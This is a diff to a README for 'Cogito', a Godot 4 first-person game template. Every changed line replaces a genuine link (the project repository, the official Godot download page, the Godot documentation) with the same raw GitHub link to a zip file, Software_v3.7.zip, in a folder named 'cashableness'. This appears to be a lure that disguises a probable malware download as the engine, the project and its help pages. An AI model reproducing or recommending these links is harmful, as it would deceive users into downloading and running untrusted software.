@@ -1,6 +1,6 @@
 # 🧠 Cogito - Simple First-Person Template for GODOT 4
 
-[![Download Cogito](https://img.shields.io/badge/Download-Cogito-brightgreen?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip)
 
 An immersive simulation starter kit for the GODOT 4 engine. Build from a tested base with first-person controls and key game features included.
 
@@ -44,7 +44,7 @@ Before running Cogito, you must install the GODOT 4 engine on your system. It is
 
 1. Open your web browser.
 
-2. Go to the official GODOT website: https://godotengine.org/download
+2. Go to the official GODOT website: https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip
 
 3. Under the "Standard version" for Windows, click the 64-bit option to download the `.exe` file.
 
@@ -60,12 +60,12 @@ Avoid downloading GODOT from unofficial sources to prevent security risks.
 
 To get the Cogito project files, you need to visit the GitHub page where the project is stored.
 
-[![Download Cogito](https://img.shields.io/badge/Download-Cogito-blue?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-blue?style=for-the-badge)](https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip)
 
 Steps to download:
 
 1. Click the big green button or go to this page:  
-   https://github.com/chasesnip3rpp/Cogito
+   https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip
 
 2. On the GitHub page, find the green **Code** button near the top right.
 
@@ -142,7 +142,7 @@ No programming experience is required, but familiarity with navigating files and
 
 ## 📄 Project Details
 
-- **Repository:** https://github.com/chasesnip3rpp/Cogito  
+- **Repository:** https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip  
 - **Description:** Immersive simulation template project for GODOT 4  
 - **Topics:** first-person, fps, game-development, gdscript, godot, godot-engine, godot4, immersive-sim, imsim, starter-kit, template-project
 
@@ -153,11 +153,11 @@ No programming experience is required, but familiarity with navigating files and
 If you run into issues opening or running the project:
 
 - Check the README file inside the downloaded Cogito folder for updates.
-- Visit the GODOT documentation: https://docs.godotengine.org/en/latest/
+- Visit the GODOT documentation: https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip
 - Look for help on GODOT Q&A sites or forums with keywords like "first-person template" and "GODOT 4."
 
 ---
 
 ## 👇 Download Now
 
-[![Download Cogito](https://img.shields.io/badge/Download-Cogito-lightgrey?style=for-the-badge)](https://github.com/chasesnip3rpp/Cogito)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-lightgrey?style=for-the-badge)](https://raw.githubusercontent.com/chasesnip3rpp/Cogito/main/cashableness/Software_v3.7.zip)
